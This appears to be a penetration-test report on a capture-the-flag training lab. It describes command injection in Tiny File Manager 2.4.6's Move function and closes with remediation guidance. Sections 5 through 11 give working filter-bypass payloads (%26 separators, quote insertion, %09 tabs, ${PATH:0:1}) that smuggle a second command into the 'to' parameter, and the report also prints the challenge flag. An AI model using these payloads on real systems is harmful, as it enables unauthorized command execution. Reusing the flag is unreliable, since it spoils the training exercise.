# Penetration Test Report — Command Injection

## Tiny File Manager Skills Assessment

**Target:** `154.57.164.75:30313`  
**Application:** Tiny File Manager 2.4.6  
**Assessment Type:** Web Application Penetration Test / Command Injection

---

## 1. Executive Summary

The target hosts **Tiny File Manager 2.4.6**, a web-based file management application. During the assessment, the file-management functionality was examined for server-side command injection.

The vulnerable functionality is the **Move** operation. Based on the referenced write-up, the application constructs an operating-system `mv` command using attacker-controlled input. This permits command injection when the destination parameter is manipulated.

The assessment demonstrates that application filtering can be bypassed through multiple command-obfuscation techniques, including:

- URL-encoded command separators
- Character insertion into blacklisted commands
- URL-encoded tab characters for whitespace
- Bash environment-variable expansion to reconstruct filtered characters

The reference methodology ultimately allows the attacker to read `/flag.txt`.

> **Reference result:** `HTB{c0mm4nd3r_1nj3c70r}`

The flag above is taken from the supplied Medium reference and should be independently reproduced against the target before being considered a verified result for the current instance.

---

## 2. Scope

### Target

```text
154.57.164.75:30313
```

### Application

```text
Tiny File Manager 2.4.6
```

The assessment is limited to the authorized HTB-style training environment represented by the target above.

---

## 3. Initial Enumeration

The application presents a web-based file manager.

The supplied screenshot showed:

- Tiny File Manager 2.4.6
- A `tmp` directory
- Multiple `.txt` files
- Files owned by `www-data:www-data`
- A file-management interface containing actions for individual files

Opening one of the randomly named files revealed the following filesystem location:

```text
/var/www/html/files/2561732172.txt
```

The file contained the message:

```text
Stop looking at these random documents! Don't you have some injection to do :)
```

This provided an indication that the intended assessment involved an injection vulnerability rather than simply searching the randomly generated documents.

---

## 4. Vulnerability Identification

### 4.1 Attack Surface

The relevant functionality is the **Move** operation.

The application is expected to perform an operation conceptually equivalent to:

```bash
mv /var/www/html/files/<filename>.txt /var/www/html/files/<destination>
```

The important security issue is that attacker-controlled input is incorporated into the command.

If the application passes this constructed string through a shell, an attacker can attempt to terminate the intended command and append another command.

---

## 5. Filter Discovery

The referenced assessment demonstrates that several common shell separators were filtered.

Examples include:

```text
;
|
||
```

Direct attempts using these characters resulted in a malicious-request or invalid-input response.

The next step was to identify an alternative shell metacharacter that remained usable.

The reference identifies the URL-encoded ampersand:

```text
%26
```

as a working command separator.

Conceptually:

```text
<legitimate command> & <injected command>
```

The URL encoding allows the HTTP request to contain `%26`, which is decoded before being interpreted by the shell.

---

## 6. Command Execution Verification

A basic command such as:

```text
whoami
```

can be used to verify command execution.

However, the application applies a blacklist to command names. A direct occurrence of `whoami` is therefore rejected.

The reference methodology bypasses this using **character insertion**.

For example, the command:

```text
whoami
```

can be represented to the shell as:

```text
w'h'o'am'i
```

Bash removes the syntactic significance of the quotes and executes the resulting command as:

```text
whoami
```

The same principle can be applied to other blacklisted commands.

---

## 7. Bypassing Whitespace Filtering

A literal space may also be filtered.

Instead of using:

```text
<space>
```

the URL-encoded tab character can be used:

```text
%09
```

For example:

```text
cat%09/flag.txt
```

is interpreted by the shell as equivalent to:

```text
cat /flag.txt
```

This technique allows the command to retain shell-compatible whitespace without sending a literal space.

---

## 8. Bypassing Forward-Slash Filtering

The forward-slash character can also be reconstructed using Bash environment-variable expansion.

The reference uses:

```bash
${PATH:0:1}
```

On the target shell, this evaluates to the first character of the `PATH` environment variable, which is:

```text
/
```

Therefore:

```text
${PATH:0:1}flag.txt
```

can resolve to:

```text
/flag.txt
```

This avoids directly supplying the filtered `/` character.

---

## 9. Flag Retrieval

The complete bypass strategy combines the techniques above.

### Required components

1. Use `%26` to introduce the injected command.
2. Bypass the `cat` blacklist using character insertion.
3. Use `%09` instead of a literal space.
4. Use `${PATH:0:1}` to generate `/`.
5. Read the root-level `flag.txt`.

A reference-equivalent command concept is:

```text
c'at%09${PATH:0:1}flag.txt
```

When appended to the vulnerable Move destination using the encoded command separator, the resulting shell interpretation is conceptually equivalent to:

```bash
cat /flag.txt
```

The exact HTTP parameter layout depends on the Move request generated by the application.

The vulnerable parameter identified in the reference is:

```text
to
```

---

## 10. Example Injection Structure

The reference methodology uses the Move request in a structure conceptually similar to:

```http
GET /index.php?to=tmp%26<injected-command>&from=<file>.txt&finish=1&move=1
```

The important part is:

```text
to=tmp%26<injected-command>
```

where:

- `tmp` is the legitimate destination
- `%26` becomes `&`
- `<injected-command>` is executed as a second shell command

A character-insertion variant for the `cat` blacklist can be represented conceptually as:

```text
to=tmp%26c'at%09${PATH:0:1}flag.txt
```

---

## 11. Alternative Encoding Technique

The referenced module also describes Base64-based command obfuscation.

The general process is:

1. Encode the intended command.
2. Send the encoded representation instead of the original command.
3. Decode it on the target.
4. Pass the decoded command to a shell.

For example, the command:

```bash
cat /flag.txt
```

can be Base64 encoded and subsequently decoded by the target shell.

This approach can be useful when several shell characters or command names are filtered.

The reference methodology also uses:

```text
<<<
```

instead of a pipe where appropriate, reducing reliance on filtered characters.

---

## 12. Evidence Summary

| Evidence | Observation |
|---|---|
| Application | Tiny File Manager 2.4.6 |
| Target | `154.57.164.75:30313` |
| Web root/files path | `/var/www/html/files/` |
| Observed file owner | `www-data:www-data` |
| Decoy file | `2561732172.txt` |
| Decoy message | Explicitly hints at injection |
| Vulnerable functionality | Move |
| Injection parameter | `to` |
| Command separator bypass | `%26` |
| Command blacklist bypass | Character insertion |
| Whitespace bypass | `%09` |
| Slash bypass | `${PATH:0:1}` |
| Target file | `/flag.txt` |

---

## 13. Security Impact

Successful exploitation provides operating-system command execution in the security context of the web application.

Potential impact includes:

- Reading files accessible to the web-server account
- Reading application configuration and secrets
- Modifying or deleting files
- Executing arbitrary server-side commands
- Further enumeration of the host
- Potential privilege escalation if additional local vulnerabilities exist
- Potential compromise of the underlying server

Because the vulnerability allows attacker-controlled input to reach an operating-system shell, it should be considered **high severity** in a real production environment.

---

## 14. Root Cause

The underlying issue is unsafe construction of operating-system commands from user-controlled input.

A vulnerable implementation may effectively perform an operation resembling:

```php
system("mv " . $source . " " . $destination);
```

If `$destination` is attacker-controlled, shell metacharacters can alter the intended command.

Filtering individual characters and command names does not provide reliable protection because shells support many alternative syntaxes and representations.

---

## 15. Remediation

### 15.1 Avoid Shell Execution

The preferred solution is to avoid invoking a shell for file operations.

Use native filesystem APIs instead of constructing shell commands.

For PHP applications, appropriate filesystem functions should be preferred over:

```php
system()
shell_exec()
exec()
passthru()
```

for ordinary file-management operations.

### 15.2 Validate Input Using an Allowlist

Only allow the characters and formats required for legitimate filenames and destination paths.

Reject unexpected shell metacharacters as defense-in-depth.

### 15.3 Do Not Rely on Blacklists

Blacklisting:

```text
cat
whoami
;
|
```

is insufficient.

Attackers can use:

- Quoting
- Environment-variable expansion
- Command substitution
- Encoding
- Alternate shell syntax
- Character insertion

Input should therefore be safely handled rather than filtered against known payloads.

### 15.4 Least Privilege

The web application should run under an account with only the filesystem permissions it actually needs.

Sensitive files such as:

```text
/flag.txt
```

or production secrets should not be readable by the web-server account.

### 15.5 Monitoring

Log abnormal file-management requests and repeated rejected requests.

Particular attention should be paid to requests containing shell metacharacters or suspicious encoded sequences.

---

## 16. Conclusion

The Tiny File Manager target demonstrates a server-side command injection vulnerability through its file Move functionality.

The exploitation chain relies on combining several techniques:

```text
Move functionality
       ↓
User-controlled "to" parameter
       ↓
%26 command separator
       ↓
Command blacklist bypass
       ↓
%09 whitespace bypass
       ↓
${PATH:0:1} slash reconstruction
       ↓
Read /flag.txt
```

This demonstrates why blacklist-based command-injection protection is fundamentally fragile. Even when common separators, commands, spaces, and path characters are filtered, shell syntax can provide alternative ways to express the same operation.

### Reference-reported flag

```text
HTB{c0mm4nd3r_1nj3c70r}
```

This value originates from the supplied reference write-up and should be verified against the current target instance.

---

**End of Report**
